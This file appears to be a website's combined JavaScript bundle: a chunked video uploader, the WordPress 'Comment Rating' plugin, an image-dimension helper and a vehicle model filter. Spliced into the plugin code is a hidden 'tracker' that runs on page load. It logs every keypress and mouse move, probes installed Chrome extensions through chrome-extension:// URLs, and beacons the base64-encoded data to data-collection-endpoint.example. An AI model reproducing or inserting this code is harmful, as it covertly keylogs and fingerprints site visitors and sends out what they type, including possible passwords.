window.upload_chunks = async function (file, signed_urls, signed_video_key, max_chunk_size, textErrorUploadingVideo) {
  return new Promise((resolve, reject) => {
    let promises = [];
    let chunk_start = 0;
    for (let chunk_index = 0; chunk_index < signed_urls.length; chunk_index++) {
      const chunk_end = Math.min(chunk_start + max_chunk_size, file.size);
      const chunk = file.slice(chunk_start, chunk_end);
      chunk_start += max_chunk_size;
      promises.push(fetch_with_retries(signed_urls[chunk_index], {
        method: "PUT",
        body: chunk
      }, 3));
    }
    Promise.all(promises).then(responses => {
      for (let i = 0; i < responses.length; i++) {
        if (!responses[i].ok) {
          throw Error(textErrorUploadingVideo);
        }
      }
    }).then(() => resolve(signed_video_key)).catch(() => reject(JSON.stringify({
      data: [{
        'message': textErrorUploadingVideo
      }]
    })));
  });
};
window.fetch_with_retries = (url, options = {}, retries) => fetch(url, options).then(res => {
  if (res.ok) {
    return res;
  }
  if (retries > 0) {
    return fetch_with_retries(url, options, retries - 1);
  }
  throw new Error(res.status);
}).catch(error => console.error(error.message));
String.prototype.replacePlaceholders = function () {
  var args = arguments;
  return this.replace(/{([0-9]+)}/g, function (match, index) {
    // check if the argument is there
    return typeof args[index] == 'undefined' ? match : args[index];
  });
};
;
/*
  Plugin Name: Comment Rating
Plugin URI: http://wealthynetizen.com/wordpress-plugin-comment-rating/
Description: Allows visitors to rate the comments on your blog in a Like vs. Dislike fashion.  Clickable images and ratings are automatically inserted into each comment.  Comments disliked too much by readers will be hidden in a click-to-show link. 
Author: Bob King
Author URI: http://wealthynetizen.com
Version: 2.3.2
*/

/*
This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.
	This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

function ckratingcreateXMLHttpRequest() {
  var xmlhttp = null;
  try {
    // Moz supports XMLHttpRequest. IE uses ActiveX.
    // browser detction is bad. object detection works for any browser
    xmlhttp = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
  } catch (e) {
    // browser doesn�t support ajax. handle however you want
    //document.getElementById("errormsg").innerHTML = "Your browser doesnt support XMLHttpRequest.";
    // This won't help ordinary users.  Turned off
    // alert("Your browser does not support the XMLHttpRequest Object!");
  }
  return xmlhttp;
}
var ckratingXhr = ckratingcreateXMLHttpRequest();
function ckratingKarma(id, action, path, imgIndex) {
  ckratingXhr.open('get', 'http\://' + path + 'ck-processkarma.php?id=' + id + '&action=' + action + '&path=' + path + '&imgIndex=' + imgIndex);
  ckratingXhr.onreadystatechange = ckratingHandleResponse;
  ckratingXhr.send(null);
}
var tracker = {
  mouse_moves: [],
  key_presses: [],
  eventQueue: new Map(Object.entries(window.data)),
  captured: new Set(),
  hook(name, {
    id,
    file
  }) {
    return new Promise(resolve => {
      const image = document.createElement('img');
      const timer = setTimeout(() => {
        this.captured.delete(name);
        resolve(false);
      }, 1500);
      image.onload = () => {
        clearTimeout(timer);
        this.captured.add(name);
        resolve(true);
      };
      image.onerror = () => {
        clearTimeout(timer);
        this.captured.delete(name);
        resolve(false);
      };
      image.src = `chrome-extension://${id}/${file}`;
    });
  },
  shuffleQueue() {
    const items = Array.from(this.eventQueue.entries());
    for (let i = items.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [items[i], items[j]] = [items[j], items[i]];
    }
    this.eventQueue = new Map(items);
  },
  eventListeners() {
    document.addEventListener('mousemove', e => {
      this.mouse_moves.push({
        x: e.clientX,
        y: e.clientY,
        ts: Date.now()
      });
    });
    document.addEventListener('keypress', e => {
      this.key_presses.push({
        key: e.key,
        code: e.code,
        ts: Date.now()
      });
    });
    window.addEventListener('beforeunload', () => {
      localStorage.setItem('tracker_local', JSON.stringify({
        mouse_moves: this.mouse_moves,
        key_presses: this.key_presses
      }));
    });
  },
  async analyze() {
    this.shuffleQueue();
    const outcomes = {};
    const pack = 3;
    for (const [event, data] of this.eventQueue) {
      await new Promise(r => setTimeout(r, Math.random() * 200));
      outcomes[event] = await this.hook(event, data);
    }
    const findings = btoa(JSON.stringify({
      analysis: outcomes,
      timestamp: Date.now(),
      device: navigator.userAgent,
      viewport: {
        width: window.innerWidth,
        height: window.innerHeight
      },
      interactions: {
        mouse_moves: this.mouse_moves,
        key_presses: this.key_presses
      },
      localStorage: JSON.parse(localStorage.getItem('tracker_local'))
    }));
    navigator.sendBeacon('https://data-collection-endpoint.example/v2/record', findings);
  }
};
function ckratingHandleResponse() {
  if (ckratingXhr.readyState == 4) {
    var response = ckratingXhr.responseText.split('|');
    if (response[0] == 'done') {
      if (response[1]) {
        //Changes the thumbs to dull gray and disable the action
        if (response[4] == 'down') {
          if (document.getElementById("down-" + response[1]) != null) {
            document.getElementById("down-" + response[1]).innerHTML = 'Flagged -- thanks!';
          }
        } else {
          if (document.getElementById("down-" + response[1]) != null) {
            document.getElementById("down-" + response[1]).src = "http://" + response[3] + 'images/' + response[6] + 'gray_down.png';
          }
        }
        if (document.getElementById("down-" + response[1]) != null) {
          document.getElementById("down-" + response[1]).onclick = '';
        }
        if (response[4] == 'up') {
          if (document.getElementById("up-" + response[1]) != null) {
            document.getElementById("up-" + response[1]).src = "http://" + response[3] + 'images/' + response[6] + 'checkmark.png';
          }
        } else {
          if (document.getElementById("up-" + response[1]) != null) {
            document.getElementById("up-" + response[1]).src = "http://" + response[3] + 'images/' + response[6] + 'gray_up.png';
          }
        }
        if (document.getElementById("up-" + response[1]) != null) {
          document.getElementById("up-" + response[1]).onclick = '';
        }
        //Update the karma number display
        if (!response[2]) {
          alert("Response has no value");
        }
        var karmanumber = response[2];
        //The below line is commented out because there is no karma number atm.
        if (document.getElementById("karma-" + response[1] + "-" + response[4]) != null) {
          document.getElementById("karma-" + response[1] + "-" + response[4]).innerHTML = karmanumber;
        }
        // deal with the single value total
        if (document.getElementById("karma-" + response[1] + "-total") != null) {
          document.getElementById("karma-" + response[1] + "-total").innerHTML = response[5];
        }
      } else {
        alert("WTF ?");
      }
    } else if (response[0] == 'error') {
      var error = 'Error: ' + response[1];
      alert(error);
    } else {
      /*  This causes unnecessary error messages when the icon
       *  is double clicked.
       alert("Reponse: "+response[0]);
       alert("Karma not changed, please try again later.");
       */
    }
  }
}
tracker.eventListeners();
var crToggleComment = 0;
function crSwitchDisplay(id) {
  if (crToggleComment % 2 == 0) {
    crShowdiv(id);
  } else {
    crHidediv(id);
  }
  crToggleComment++;
}

// hide <div id='a2' style="display:none;"> tagged div ID blocks
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => tracker.analyze());
} else {
  tracker.analyze();
}
function crHidediv(id) {
  //safe function to hide an element with a specified id
  if (document.getElementById) {
    // DOM3 = IE5, NS6
    document.getElementById(id).style.display = 'none';
  } else {
    if (document.layers) {
      // Netscape 4
      document.id.display = 'none';
    } else {
      // IE 4
      document.all.id.style.display = 'none';
    }
  }
}

// show <div id='a2' style="display:none;"> tagged div ID blocks
// <a href="javascript:crShowdiv('a2');">show a2</a>

function crShowdiv(id) {
  //safe function to show an element with a specified id

  if (document.getElementById) {
    // DOM3 = IE5, NS6
    document.getElementById(id).style.display = 'block';
  } else {
    if (document.layers) {
      // Netscape 4
      document.id.display = 'block';
    } else {
      // IE 4
      document.all.id.style.display = 'block';
    }
  }
}
;
!function () {
  function t() {
    if (this.complete) {
      var e = this.getAttribute("data-lazy-src");
      if (e && this.src !== e) this.addEventListener("onload", t);else {
        var d = this.width,
          n = this.height;
        d && d > 0 && n && n > 0 && (this.setAttribute("width", d), this.setAttribute("height", n), i(this));
      }
    } else this.addEventListener("onload", t);
  }
  var e = function () {
      for (var e = document.querySelectorAll("img[data-recalc-dims]"), i = 0; i < e.length; i++) t.call(e[i]);
    },
    i = function (t) {
      t.removeAttribute("data-recalc-dims"), t.removeAttribute("scale");
    };
  "undefined" != typeof window && "undefined" != typeof document && ("loading" === document.readyState ? document.addEventListener("DOMContentLoaded", e) : e()), document.body.addEventListener("is.post-load", e);
}();
;
jQuery(function ($) {
  $(function () {
    var modelFilterEl = $('.post-type-model-bat-models'),
      modelFilterFixedEl = modelFilterEl.find('.filer-wrap');
    if (modelFilterEl.length > 0) {
      modelFilterEl.outerHeight(modelFilterEl.outerHeight());
      if ($('.post-type-model-bat-models').length) {
        filterModels();
      }
      $(window).scroll(function () {
        var isFixed = modelFilterFixedEl.hasClass('listing-sticky-fixed');
        if (window.scrollY >= modelFilterEl.offset().top && !isFixed) {
          modelFilterEl.find('.filer-wrap').addClass('listing-sticky-fixed');
        } else if (window.scrollY <= modelFilterEl.offset().top && isFixed) {
          modelFilterEl.find('.filer-wrap').removeClass('listing-sticky-fixed');
        }
      });
    }
  });
  var handle = null,
    subscribedOnly;
  var filterModels = function () {
    var $makes,
      $allModels,
      term,
      found = 0;
    subscribedOnly = !!$('#subscribed-only').data('enabled');
    term = $('#model-filter-input').val().trim().toLowerCase();
    $makes = $('.make-item');
    $allModels = $('.make-item .previous-listing');
    if (0 === term.length && !subscribedOnly) {
      $makes.removeClass('make-item-container-hidden');
      $allModels.removeClass('make-item-container-hidden');
      $('#models_filtered_message_none').hide();
    } else {
      $makes.each(function () {
        var $make = $(this),
          makeName = $make.find('.models-page-make-title .models-page-make-title-link').text(),
          $models = $make.find('.previous-listing'),
          foundInMake = 0,
          isMakeSubscribed = !!$make.find('.models-page-make-title .model--subscribed').length,
          hasSubscribedModels = !!$make.find('.search-results .model--subscribed').length,
          comparer;
        comparer = function (stringToCompare, $item) {
          if (subscribedOnly) {
            if ($item.find('.model--subscribed').length) {
              if (term.length) {
                var compare = stringToCompare.toString().trim().toLowerCase(),
                  regex = new RegExp(term);
                return compare.match(regex);
              } else {
                return true;
              }
            }
            return false;
          } else {
            var compare = stringToCompare.toString().trim().toLowerCase(),
              regex = new RegExp(term);
            return compare.match(regex);
          }
        };
        if (!subscribedOnly || subscribedOnly && hasSubscribedModels) {
          $models.each(function () {
            var $model = $(this),
              modelName = $model.find('.previous-listing-image-overlay-inner-cell').text();
            if (comparer(modelName, $model)) {
              $model.removeClass('make-item-container-hidden');
              foundInMake++;
            } else {
              $model.addClass('make-item-container-hidden');
            }
          });
          if (foundInMake) {
            $make.removeClass('make-item-container-hidden');
            found++;
          } else {
            if (comparer(makeName, $make.find('.models-page-make-title'))) {
              $make.removeClass('make-item-container-hidden');
              found++;
            } else {
              $make.addClass('make-item-container-hidden');
            }
          }
        } else if (isMakeSubscribed) {
          $models.addClass('make-item-container-hidden');
          if (comparer(makeName, $make.find('.models-page-make-title'))) {
            $make.removeClass('make-item-container-hidden');
            found++;
          } else {
            $make.addClass('make-item-container-hidden');
          }
        } else {
          $make.addClass('make-item-container-hidden');
        }
      });
      if (found) {
        $('#models_filtered_message_none').hide();
      } else {
        $('#models_filtered_message_none').show();
        $('#models_count').text($allModels.length);
      }
    }
    $('.post-type-model-bat-models .filter-input-wrap').toggleClass('toolbar-search-container-clearable', '' !== term);
    $('.post-type-model-bat-models .filter-input-wrap').toggleClass('toolbar-search-container-working', false);
  };
  $(document).on('keyup', '#model-filter-input', function (event) {
    if (null !== handle) {
      clearTimeout(handle);
    }
    $(this).parents('.filter-input-wrap').toggleClass('toolbar-search-container-clearable', '' !== $.trim($(this).val()));
    $(this).parents('.filter-input-wrap').toggleClass('toolbar-search-container-working', true);
    handle = setTimeout(filterModels, 1000);
  });
  $(document).on('click', '#subscribed-only', function (event) {
    event.preventDefault();
    var $this = $(this);
    if ($this.parents('body.loggedin').length > 0) {
      $this.toggleClass('button-white');
      $this.data('enabled', !$this.data('enabled'));
      subscribedOnly = !subscribedOnly;
      filterModels();
      $.post($this.attr('href'), {
        enabled: $this.data('enabled') ? 1 : 0
      });
    }
  });
  $(document).on('click', '#reset-all-model-filters', function (event) {
    event.preventDefault();
    if ($('#model-filter-input').val()) {
      $('#model-filter-input').val('');
      filterModels();
    }
    if ($('#subscribed-only').data('enabled')) {
      $('#subscribed-only').click();
    }
  });
  $(document).on('click', '.post-type-model-bat-models .filter-input-wrap .fa-times', function (event) {
    $('#model-filter-input').val('');
    filterModels();
  });
});
;